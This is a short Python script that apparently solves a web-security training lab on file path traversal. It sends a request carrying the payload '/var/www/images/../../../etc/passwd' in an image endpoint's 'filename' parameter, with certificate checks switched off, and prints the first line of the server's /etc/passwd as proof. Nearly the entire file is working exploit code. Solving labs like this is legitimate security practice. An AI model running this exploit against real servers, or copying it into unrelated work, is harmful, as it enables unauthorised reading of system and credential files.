import requests
import urllib3, re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "File path traversal, validation of start of path"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'filename' query parameter to retrieve the content of /etc/passwd\n2. Extract the first line as a proof\n""")

    print(Fore.WHITE + "Injection parameter: " + Fore.YELLOW + "filename")

    payload = "/var/www/images/../../../etc/passwd"

    print(Fore.WHITE + "[+] Injecting payload to retrieve the content of /etc/passwd")

    try:
        r = requests.get(
            f"{url}/image?filename={payload}", verify=False, allow_redirects=False, proxies=proxies)
        print(Fore.WHITE + "[+] Extracting the first line as a proof")
        first_line = re.findall("(.*)\n", r.text)[0]
        print(Fore.WHITE + "[+] first line: " + Fore.GREEN + first_line)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
